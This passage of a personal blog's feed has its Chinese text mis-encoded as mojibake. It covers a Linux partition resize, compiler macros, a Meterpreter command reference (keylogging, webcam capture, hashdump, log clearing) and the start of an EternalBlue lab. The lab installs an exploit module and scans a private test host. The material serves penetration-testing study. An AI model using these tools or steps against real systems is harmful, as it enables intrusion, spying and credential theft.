id="2-3-æ–°å»ºåˆ†åŒº"><a href="#2-3-æ–°å»ºåˆ†åŒº" class="headerlink" title="2.3 æ–°å»ºåˆ†åŒº"></a>2.3 æ–°å»ºåˆ†åŒº</h3><ul><li><p>ä¾æ¬¡é”®å…¥<code>n</code>ï¼Œ<code>p</code>ï¼Œ<code>2</code>ï¼Œ<code>no</code>ï¼Œæ¥é‡æ–°åˆ›å»º/dev/sda2ã€‚ç”±äºä¹‹å‰åˆ é™¤è¯¥åˆ†åŒºåä½¿å¾—å®ƒä¸æ­¤ç£ç›˜ä¸Šæœªä½¿ç”¨çš„ç©ºé—´åˆå¹¶ï¼Œå› æ­¤åˆ›å»ºæ–°åˆ†åŒºæ—¶èƒ½å¤Ÿé€šè¿‡æŒ‡å®š<code>start</code>å’Œ<code>end</code>æ¥æ‰©å¤§æ–°åˆ†åŒºçš„å®¹é‡ã€‚</p><p>æ³¨æ„åœ¨è¢«è¯¢é—®æ˜¯å¦ç§»é™¤æ–°åˆ†åŒº/dev/sda2å¸¦æœ‰çš„<strong>signature</strong>æ—¶ï¼Œé€‰æ‹©noï¼Œå¦åˆ™è¯¥åˆ†åŒºåŸæœ‰çš„æ•°æ®ä¼šä¸¢å¤±ã€‚</p></li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210932.png" alt=""></p><ul><li>å¦‚æœæ­¤è¿‡ç¨‹æ“ä½œæ— è¯¯å¯ä»¥é”®å…¥<code>w</code>ä¿å­˜å¹¶é€€å‡ºã€‚å¦‚æœæœ‰é—®é¢˜å¯ä»¥é”®å…¥<code>q</code>ä¸ä¿å­˜å¹¶é€€å‡ºã€‚</li></ul><h3 id="2-4-æ›´æ–°åˆ†åŒºè¡¨"><a href="#2-4-æ›´æ–°åˆ†åŒºè¡¨" class="headerlink" title="2.4 æ›´æ–°åˆ†åŒºè¡¨"></a>2.4 æ›´æ–°åˆ†åŒºè¡¨</h3><ul><li><p>æ­¤æ—¶<code>df -h</code>æŸ¥çœ‹çš„ç»“æœæ˜¯å¾…æ‰©å®¹åˆ†åŒºå®¹é‡ä»ç„¶æœªå‘ç”Ÿå˜åŒ–ï¼Œå› ä¸ºè¿˜éœ€è¦<strong>è°ƒæ•´åˆ†åŒºè¡¨</strong>ã€‚</p></li><li><p><code>e2fsck -f /dev/sda2</code>æ£€æŸ¥åˆ†åŒºä¿¡æ¯</p></li><li><p>è°ƒæ•´åˆ†åŒºå¤§å°ã€‚æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li><p>ä¸€ç§æ˜¯å¸è½½å¾…æ‰©å®¹åˆ†åŒºï¼Œç„¶åè¿è¡Œ<code>resize2fs -f /dev/sda2</code></p></li><li><p>å¦ä¸€ç§æ˜¯ä¸ç”¨å¸è½½ï¼Œåœ¨çº¿æ‰©å®¹ã€‚ä¸å¸è½½ / åˆ†åŒºç›´æ¥è¿è¡Œ<code>resize2fs -f /dev/sda2</code>ä¼šå¾—åˆ°å¦‚ä¸‹æŠ¥é”™ï¼š</p></li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102212415.png" alt=""></p><p>å› æ­¤éœ€è¦é‡æ–°æŒ‚è½½<code>/</code>åˆ†åŒºä¸º<strong>å¯è¯»å†™æ¨¡å¼</strong><code>mount -o remount, rw /</code>ï¼Œç„¶åå°±å¯ä»¥è°ƒæ•´åˆ†åŒºå¤§å°äº†ã€‚ä¸”æœªä½¿ç”¨çš„ç©ºé—´è¢«æ ¼å¼åŒ–ä¸ºå’Œæ ¹åˆ†åŒºä¸€è‡´çš„ext4ã€‚</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102212921.png" alt=""></p></li><li><p>rebootä¹‹åæŸ¥çœ‹ç»“æœã€‚å‘ç°ä¹‹å‰ç©ºé—²çš„6.4Gç©ºé—´å·²ç»å¹¶å…¥å¾…æ‰©å®¹çš„æ ¹åˆ†åŒºã€‚<strong>æ‰©å®¹æˆåŠŸ</strong></p></li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102213630.png" alt=""></p><h2 id="3-ä¸€ç‚¹è¡¥å……"><a href="#3-ä¸€ç‚¹è¡¥å……" class="headerlink" title="3 ä¸€ç‚¹è¡¥å……"></a>3 ä¸€ç‚¹è¡¥å……</h2><p>åæœŸåˆ†åˆ«åœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šåšè¿‡å°è¯•ï¼Œå‘ç°æœ‰çš„Linuxå‘è¡Œç‰ˆéœ€è¦é‡æ–°æŒ‚è½½/åˆ†åŒºæ¥æ›´æ–°åˆ†åŒºè¡¨å¤§å°ï¼Œæ¯”å¦‚Kaliã€‚è€Œæœ‰çš„å‘è¡Œç‰ˆæ¯”å¦‚CentOSï¼ŒUbuntuåˆ™ä¸éœ€è¦ï¼Œè¿›å…¥æ“ä½œç³»ç»Ÿåå¯ä»¥ç›´æ¥resize2fs</p><h1 id="Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆLVMï¼‰"><a href="#Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆLVMï¼‰" class="headerlink" title="Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆLVMï¼‰"></a>Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆLVMï¼‰</h1><p>TODO</p>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å„ä¸ªå¹³å°å’Œç¼–è¯‘å™¨é¢„å®šä¹‰çš„å®</title>
    <link href="/2019/11/14/%E5%90%84%E4%B8%AA%E5%B9%B3%E5%8F%B0%E5%92%8C%E7%BC%96%E8%AF%91%E5%99%A8%E9%A2%84%E5%AE%9A%E4%B9%89%E7%9A%84%E5%AE%8F/"/>
    <url>/2019/11/14/%E5%90%84%E4%B8%AA%E5%B9%B3%E5%8F%B0%E5%92%8C%E7%BC%96%E8%AF%91%E5%99%A8%E9%A2%84%E5%AE%9A%E4%B9%89%E7%9A%84%E5%AE%8F/</url>
    
    <content type="html"><![CDATA[<p>åœ¨è·¨å¹³å°ç¼–ç¨‹ä¸­ï¼Œé€šè¿‡å®æ¥åŒºåˆ†ä¸åŒçš„å¹³å°æ˜¯ä¸€ç§è¾ƒä¸ºå¸¸è§çš„æ–¹æ³•ã€‚</p><span id="more"></span><h2 id="1-ä¸åŒå¹³å°"><a href="#1-ä¸åŒå¹³å°" class="headerlink" title="1 ä¸åŒå¹³å°"></a>1 ä¸åŒå¹³å°</h2><h3 id="1-1-Windows"><a href="#1-1-Windows" class="headerlink" title="1.1 Windows"></a>1.1 Windows</h3><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN32</span>    <span class="hljs-comment">//is defined for windows (32-bit and 64-bit)</span>    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span>    <span class="hljs-comment">//windows 64bits</span>    <span class="hljs-meta">#<span class="hljs-keyword">else</span></span>    <span class="hljs-comment">//define something for  windows (32-bit only)</span><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-comment">//GUI App</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WINDOWS</span><span class="hljs-comment">//CUI App</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _CONSOLE</span><span class="hljs-comment">//Windows Versions</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WINVER <span class="hljs-comment">// or #ifdef _WIN32_WINNT</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> (WINVER &gt;= 0x030a) <span class="hljs-comment">//Windows 3.1 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> (WINVER &gt;= 0x0400) <span class="hljs-comment">//Windows 95/NT4.0 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> (WINVER &gt;= 0x0410) <span class="hljs-comment">//Windows 98 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> (WINVER &gt;= 0x0500) <span class="hljs-comment">//Windows Me/2000 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> (WINVER &gt;= 0x0501) <span class="hljs-comment">//Windows XP and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> (WINVER &gt;= 0x0600) <span class="hljs-comment">//Windows Vista and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> (WINVER &gt;= 0x0601) <span class="hljs-comment">//Windows 7 and above</span></span><span class="hljs-comment">//DOS</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __DOS__</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __MSDOS__</span><span class="hljs-comment">//Cygwin</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __CYGWIN__</span></code></pre><h3 id="1-2-Unix"><a href="#1-2-Unix" class="headerlink" title="1.2 Unix"></a>1.2 Unix</h3><pre><code class="hljs C"><span class="hljs-comment">//UNIX</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __unix</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __unix__</span><span class="hljs-comment">//Linux</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span><span class="hljs-comment">//FreeBSD</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __FreeBSD__</span><span class="hljs-comment">//NetBSD</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __NetBSD__</span></code></pre><h3 id="1-3-MacOS-amp-iOS"><a href="#1-3-MacOS-amp-iOS" class="headerlink" title="1.3 MacOS &amp; iOS"></a>1.3 MacOS &amp; iOS</h3><pre><code class="hljs C"><span class="hljs-comment">// Universal</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span>    <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;TargetConditionals.h&quot;</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> TARGET_IPHONE_SIMULATOR</span>        <span class="hljs-comment">// iOS Simulator</span>    <span class="hljs-meta">#<span class="hljs-keyword">elif</span> TARGET_OS_IPHONE</span>        <span class="hljs-comment">// iOS device</span>    <span class="hljs-meta">#<span class="hljs-keyword">elif</span> TARGET_OS_MAC</span>        <span class="hljs-comment">// Other kinds of Mac OS</span>    <span class="hljs-meta">#<span class="hljs-keyword">else</span></span>        <span class="hljs-comment">//Unknown Apple platform</span>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-comment">// Mac OS 9</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> Macintosh</span><span class="hljs-comment">//Mac OS X</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__&amp;&amp;__MACH__</span></code></pre><h3 id="1-4-Android"><a href="#1-4-Android" class="headerlink" title="1.4 Android"></a>1.4 Android</h3><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __ANDROID__</span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> __ANDROID_API__ &gt;= 1 <span class="hljs-comment">//Android Version &gt;= 1.0</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> __ANDROID_API__ &gt;= 5 <span class="hljs-comment">//Android Version &gt;= 2.0</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> __ANDROID_API__ &gt;= 11 <span class="hljs-comment">//Android Version &gt;= 3.0</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> __ANDROID_API__ &gt;= 1 <span class="hljs-comment">//Android Version &gt;= 1.0</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> __ANDROID_API__ &gt;= 1 <span class="hljs-comment">//Android Version &gt;= 1.0</span></span></code></pre><h2 id="2-ä¸åŒç¼–è¯‘å™¨"><a href="#2-ä¸åŒç¼–è¯‘å™¨" class="headerlink" title="2 ä¸åŒç¼–è¯‘å™¨"></a>2 ä¸åŒç¼–è¯‘å™¨</h2><h3 id="2-1-GCC"><a href="#2-1-GCC" class="headerlink" title="2.1 GCC"></a>2.1 GCC</h3><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __GNUC__</span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> __GNUC__ &gt;= 3 <span class="hljs-comment">//GCC-3.0 and above</span></span></code></pre><h3 id="2-2-Visual-C"><a href="#2-2-Visual-C" class="headerlink" title="2.2 Visual C++"></a>2.2 Visual C++</h3><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _MSC_VER (éVCç¼–è¯‘å™¨å¾ˆå¤šåœ°æ–¹ä¹Ÿæœ‰å®šä¹‰)</span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1000 <span class="hljs-comment">//MSVC++4.0 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1100 <span class="hljs-comment">//MSVC++5.0 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1200 <span class="hljs-comment">//MSVC++6.0 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1300 <span class="hljs-comment">//MSVC++7.0 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1400 <span class="hljs-comment">//MSVC++8.0 and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1500 <span class="hljs-comment">//MSVC++9.0 (Visual Studio 2008) and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1600 <span class="hljs-comment">//MSVC++10.0 (Visual Studio 2010) and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1700 <span class="hljs-comment">//MSVC++11.0 (Visual Studio 2012) and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1800 <span class="hljs-comment">//MSVC++12.0 (Visual Studio 2013) and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1900 <span class="hljs-comment">//MSVC++14.0 (Visual Studio 2015) and above</span></span>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> _MSC_VER &gt;= 1910 <span class="hljs-comment">//MSVC++14.1 (Visual Studio 2017) and above</span></span></code></pre><h3 id="2-3-Borland-C"><a href="#2-3-Borland-C" class="headerlink" title="2.3 Borland C++"></a>2.3 Borland C++</h3><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __BORLANDC__</span></code></pre><h3 id="2-4-CLANG"><a href="#2-4-CLANG" class="headerlink" title="2.4 CLANG"></a>2.4 CLANG</h3><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> </span></code></pre><h2 id="3-å…¶å®ƒ"><a href="#3-å…¶å®ƒ" class="headerlink" title="3 å…¶å®ƒ"></a>3 å…¶å®ƒ</h2><p>todo</p>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€æ¸—é€ã€‘meterpreterå‘½ä»¤è¯¦è§£</title>
    <link href="/2019/11/14/%E6%B8%97%E9%80%8F-meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <url>/2019/11/14/%E6%B8%97%E9%80%8F-meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1 ç®€ä»‹"></a>1 ç®€ä»‹</h2><p><strong>meterpreter</strong>æ˜¯ä¸€ä¸ªä¸ºæ”»å‡»è€…æä¾›<strong>äº¤äº’æ€§shell</strong>ä»¥ä¾¿äºåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»£ç çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</p><p>å®ƒé€šè¿‡æ³¨å…¥ç‰¹å®šçš„payloadåˆ°ç›®æ ‡æœºå™¨å†…å­˜ä¸­çš„DLLï¼Œæ¥å®ç°æ§åˆ¶ã€‚</p><span id="more"></span><h2 id="2-å‘½ä»¤"><a href="#2-å‘½ä»¤" class="headerlink" title="2 å‘½ä»¤"></a>2 å‘½ä»¤</h2><ul><li><code>help</code>ï¼šè·å–å¸®åŠ©æ–‡æ¡£ï¼Œé‡Œé¢åŒ…å«äº†æ‰€æœ‰çš„meterpreterçš„å‘½ä»¤çš„åŠŸèƒ½</li></ul><h3 id="2-1-Core-Commands"><a href="#2-1-Core-Commands" class="headerlink" title="2.1 Core Commands"></a>2.1 Core Commands</h3><blockquote><p>meterpreter &gt; ?  å¸®åŠ©èœå•</p><p>meterpreter &gt; background å°†å½“å‰sessionç½®äºåå°</p><p>meterpreter &gt; bgkill killæ‰åå°æŸmeterpreterçš„ä¼šè¯</p><p>meterpreter &gt; bgrun ä»¥åå°çº¿ç¨‹çš„èº«ä»½æ‰§è¡Œä¸€ä¸ªmeterpreterçš„è„šæœ¬</p><p>meterpreter &gt; channel æ˜¾ç¤ºæˆ–æ§åˆ¶æ‰€æœ‰æ´»åŠ¨çš„channel</p><p>meterpreter &gt; [read|write] ä»channelä¸­è¯»å‡ºæ•°æ®|å‘channelä¸­å†™å…¥æ•°æ®</p><p>meterpreter &gt; close å…³é—­ä¸€ä¸ªchannel</p><p>meterpreter &gt; [enable|disable]_unicode_encoding</p><p>meterpreter &gt; [set|get]_timeouts</p><p>meterpreter &gt; [uuid|guid]</p><p>meterpreter &gt; info</p><p>meterpreter &gt; irb</p><p>meterpreter &gt; load</p><p>meterpreter &gt; machine_id</p><p>meterpreter &gt; migrate</p><p>meterpreter &gt; pivot</p><p>meterpreter &gt; resource</p><p>meterpreter &gt; run</p><p>meterpreter &gt; sessions</p><p>meterpreter &gt; transport</p></blockquote><h3 id="2-2-File-System-Commands"><a href="#2-2-File-System-Commands" class="headerlink" title="2.2 File System Commands"></a>2.2 File System Commands</h3><pre><code class="hljs shell">meterpreter &gt; catmeterpreter &gt; cdmeterpreter &gt; checksummeterpreter &gt; [cp|lcd]meterpreter &gt; dirmeterpreter &gt; [ls|lls]meterpreter &gt; [download|upload]meterpreter &gt; editmeterpreter &gt; [getlwd|getwd]meterpreter &gt; [pwd|lpwd]meterpreter &gt; [mkdir|rmdir]meterpreter &gt; mvmeterpreter &gt; rmmeterpreter &gt; searchmeterpreter &gt; show_mount</code></pre><h3 id="2-3-Networking-Commands"><a href="#2-3-Networking-Commands" class="headerlink" title="2.3 Networking Commands"></a>2.3 Networking Commands</h3><ul><li>arp</li><li>getproxy</li><li>ifconfig</li><li>ipconfig</li><li>netstat</li><li>portfwd</li><li>resolve</li><li>route</li></ul><h3 id="2-4-System-Commands"><a href="#2-4-System-Commands" class="headerlink" title="2.4 System Commands"></a>2.4 System Commands</h3><ul><li>clearev</li><li>drop_token</li><li>execute</li><li>getenv</li><li>getpid</li><li>getprivs</li><li>getsid</li><li>getuid</li><li>kill</li><li>localtime</li><li>pgrep</li><li>pkill</li><li>ps</li><li>reboot</li><li>reg</li><li>rev2self</li><li>shell</li><li>shutdown</li><li>steal_token</li><li>suspend</li><li>sysinfo</li></ul><h3 id="2-5-User-interface-Commands"><a href="#2-5-User-interface-Commands" class="headerlink" title="2.5 User interface Commands"></a>2.5 User interface Commands</h3><ul><li>enumdesktops</li><li>getdesktop</li><li>idletime</li><li>keyscan_[dump|start|stop]</li><li>screenshot</li><li>setdesktop</li><li>uictl</li></ul><h3 id="2-6-Webcam-Commands"><a href="#2-6-Webcam-Commands" class="headerlink" title="2.6 Webcam Commands"></a>2.6 Webcam Commands</h3><ul><li>record_mic</li><li>webcam_chat</li><li>webcam_list</li><li>webcam_snap</li><li>webcam_stream</li></ul><h3 id="2-7-Audio-Poutput-Commands"><a href="#2-7-Audio-Poutput-Commands" class="headerlink" title="2.7 Audio Poutput Commands"></a>2.7 Audio Poutput Commands</h3><ul><li>play</li></ul><h3 id="2-8-Elevate-Commands"><a href="#2-8-Elevate-Commands" class="headerlink" title="2.8 Elevate Commands"></a>2.8 Elevate Commands</h3><ul><li>getsystem</li></ul><h3 id="2-9-Password-database-Commands"><a href="#2-9-Password-database-Commands" class="headerlink" title="2.9 Password database Commands"></a>2.9 Password database Commands</h3><ul><li>hashdump</li></ul><h3 id="2-10-Timestomp-Commands"><a href="#2-10-Timestomp-Commands" class="headerlink" title="2.10 Timestomp Commands"></a>2.10 Timestomp Commands</h3><ul><li>timestomp</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
      <tag>Penetration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€æ¸—é€ã€‘MS17-010æ¼æ´å¤ç°</title>
    <link href="/2019/11/14/%E6%B8%97%E9%80%8F-MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2019/11/14/%E6%B8%97%E9%80%8F-MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-æ¼æ´åŸç†"><a href="#1-æ¼æ´åŸç†" class="headerlink" title="1 æ¼æ´åŸç†"></a>1 æ¼æ´åŸç†</h2><h3 id="1-1-ç®€ä»‹"><a href="#1-1-ç®€ä»‹" class="headerlink" title="1.1 ç®€ä»‹"></a>1.1 ç®€ä»‹</h3><p><strong>EternalBlue(åœ¨å¾®è½¯çš„MS17-010ä¸­è¢«ä¿®å¤)æ˜¯åœ¨Windowsçš„SMBæœåŠ¡å¤„ç†SMB v1è¯·æ±‚æ—¶å‘ç”Ÿçš„æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å¯¼è‡´æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</strong></p><p>ä»EternalBlueè¿™ä¸ªExploitè¢«å½±å­ç»çºªäººå…¬å¸ƒåˆ°äº’è”ç½‘ä¸Šåï¼Œå°±æˆä¸ºäº†â€œæ˜æ˜Ÿâ€ã€‚è¿™ä¸ªExploitè¢«å¤šæ¬¾æ¶æ„è½¯ä»¶åˆ©ç”¨ã€‚åŒ…æ‹¬è‚†è™çš„<strong>WannaCrypt</strong>ï¼Œæ— æ–‡ä»¶çš„å‹’ç´¢è½¯ä»¶<strong>UIWIX</strong>å’ŒSMBè •è™«<strong>EternalRocks</strong>ã€‚</p><span id="more"></span><h3 id="1-2-æ¼æ´ç®€æ"><a href="#1-2-æ¼æ´ç®€æ" class="headerlink" title="1.2 æ¼æ´ç®€æ"></a>1.2 æ¼æ´ç®€æ</h3><p><strong>Eternalblueåˆ©ç”¨äº†3ä¸ªä¸åŒçš„bug</strong></p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯å†…æ ¸æ€å‡½æ•°<strong>srv!SrvOs2FeaListToNt</strong>åœ¨å¤„ç†FEA(File Extended Attributes)è½¬æ¢æ—¶ï¼Œç”±äºé”™è¯¯åœ°ä½¿ç”¨çš„<strong>WORDå¼ºåˆ¶ç±»å‹è½¬æ¢</strong>ï¼Œå¯¼è‡´åœ¨å¤§éåˆ†é¡µæ± (å†…æ ¸çš„æ•°æ®ç»“æ„ï¼ŒLarge Non-Paged Kernel Pool)çš„<strong>ç¼“å†²åŒºæº¢å‡º</strong>ã€‚</li><li>ç¬¬äºŒä¸ªæ¼æ´å¯ä»¥è§¦å‘ç¼“å†²åŒºæº¢å‡ºï¼Œè¿™æ˜¯ç”±äºSMBåè®®å®šä¹‰çš„ä¸¤ä¸ªå­å‘½ä»¤SMB_COM_TRANSACTION2å’ŒSMB_COM_NT_TRANSACTçš„å·®åˆ«ã€‚å¦‚æœæœ‰å¤ªå¤šçš„æ•°æ®è¦åŒ…å«åœ¨ä¸€ä¸ªå•ç‹¬çš„åŒ…ä¸­ï¼Œå°±éœ€è¦_SECONDARYå‘½ä»¤ã€‚TRANSACTION2å’ŒNT_TRANSACTçš„å…³é”®åŒºåˆ«åœ¨äº<strong>åè€…è°ƒç”¨çš„æ•°æ®åŒ…æ˜¯å‰è€…å¤§å°çš„2å€</strong>ã€‚å¦‚æœå®¢æˆ·ç«¯ä½¿ç”¨NT_TRANSACTå­å‘½ä»¤åœ¨TRANSACTION2å­å‘½ä»¤å‰å‘é€ä¼ªé€ çš„æ¶ˆæ¯ï¼Œå°±ä¼šå‡ºç°éªŒè¯é”™è¯¯ã€‚å¦‚æœåè®®å‘ç°æ¥æ”¶äº†2ä¸ªåˆ†å¼€çš„å­å‘½ä»¤ï¼Œå°±ä¼šæ ¹æ®æœ€åæ¥æ”¶çš„åŒ…çš„ç±»å‹æ¥åˆ†é…ç±»å‹å’Œå¤§å°ã€‚å› ä¸ºæœ€åæ¥æ”¶çš„åŒ…æ¯”è¾ƒå°ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªåŒ…ä¼šå ç”¨æ¯”åˆ†é…ç©ºé—´æ›´å¤šçš„ç©ºé—´ã€‚</li><li>ä¸€æ—¦æ”»å‡»è€…å®Œæˆåˆå§‹çš„æº¢å‡ºï¼Œå°±å¯ä»¥åˆ©ç”¨SMB v1ä¸­çš„ç¬¬3ä¸ªæ¼æ´æ¥è¿›è¡ŒHeap Spraying(å †å–·å°„)ï¼Œå¯¼è‡´åœ¨ç»™å®šåœ°å€åˆ†é…ä¸€å—å†…å­˜ã€‚ç„¶åï¼Œæ”»å‡»è€…å°±å¯ä»¥å†™å…¥å’Œæ‰§è¡Œshellcodeæ¥æ§åˆ¶ç³»ç»Ÿã€‚</li></ul><h2 id="2-æ¼æ´å¤ç°"><a href="#2-æ¼æ´å¤ç°" class="headerlink" title="2 æ¼æ´å¤ç°"></a>2 æ¼æ´å¤ç°</h2><h3 id="2-1-æ¸—é€Windows7-32-bit"><a href="#2-1-æ¸—é€Windows7-32-bit" class="headerlink" title="2.1 æ¸—é€Windows7 32-bit"></a>2.1 æ¸—é€Windows7 32-bit</h3><h4 id="2-1-1-å®éªŒç¯å¢ƒ"><a href="#2-1-1-å®éªŒç¯å¢ƒ" class="headerlink" title="2.1.1 å®éªŒç¯å¢ƒ"></a>2.1.1 å®éªŒç¯å¢ƒ</h4><p><strong>å®éªŒå¹³å°ï¼š</strong></p><ul><li>å¸¦æœ‰MS17-010æ¼æ´çš„Windows 7 pro x86ï¼Œ å†…éƒ¨ç‰ˆæœ¬7601<ul><li><strong>IPï¼š192.168.188.136</strong></li></ul></li><li>Kali Linuxï¼Œç”¨äºæ¸—é€<ul><li><strong>IPï¼š192.168.188.135</strong></li></ul></li></ul><p><strong>å®éªŒé…ç½®ï¼š</strong></p><p>kaliæ²¡æœ‰32ä½æœºå™¨çš„æ¸—é€æ¨¡å—ï¼Œæˆ‘ä»¬éœ€è¦åšä»¥ä¸‹é…ç½®</p><ul><li><strong>å®‰è£…wine 32</strong></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># root æƒé™</span>dpkg --add-architecture i386apt-get updateapt-get install wine32</code></pre><ul><li><strong>æ‹‰å–EternalBlue_Doublepulsaræ”»å‡»æ¨¡å—</strong></li></ul><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit<span class="hljs-comment"># å°†æ¨¡å—æ‹·è´åˆ°msfçš„ç›¸åº”ç›®å½•</span><span class="hljs-built_in">cd</span> Eternalblue-Doublepulsar-metasploit<span class="hljs-built_in">cp</span> -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></pre><ul><li><strong>è¿è¡Œpostgresql</strong></li></ul><pre><code class="hljs bash">service postgresql start</code></pre><h4 id="2-1-2-ä¿¡æ¯æœé›†"><a href="#2-1-2-ä¿¡æ¯æœé›†" class="headerlink" title="2.1.2 ä¿¡æ¯æœé›†"></a>2.1.2 ä¿¡æ¯æœé›†</h4><ul><li><strong>nmapæ‰«æ</strong></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># root æƒé™</span>namp -sS -sV -Pn 192.168.188.136</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191107174140.png" alt=""></p><p>å‘ç°è¯¥win7å¼€æ”¾äº†445ç«¯å£ï¼Œå¯è¿›ä¸€æ­¥é‡‡ç”¨msfconsoleè¿›è¡Œæ‰«æåˆ†æ</p><ul><li><strong>æŸ¥çœ‹å¹¶ä½¿ç”¨è¾…åŠ©æ‰«ææ¨¡å—æµ‹è¯•ç›®æ ‡æ˜¯å¦å¯æ”»å‡»</strong></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># è¿è¡Œmsfconsoleå·¥å…·</span>msfconsole<span class="hljs-comment"># æœç´¢ms17-010ç›¸å…³æ¨¡å—ï¼Œå¹¶é‡‡ç”¨è¾…åŠ©æ¨¡å—è¿›è¡Œæµ‹è¯•</span>search ms17-010<span class="hljs-comment"># å‘ç°æœ‰ä¸€ä¸ªms17_010çš„æ‰«ææ£€æµ‹æ¨¡å—å¯ç”¨, use</span>use auxiliary/scanner/smb/smb_ms17_010</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164105.png" alt=""></p><pre><code class="hljs bash"><span class="hljs-comment"># 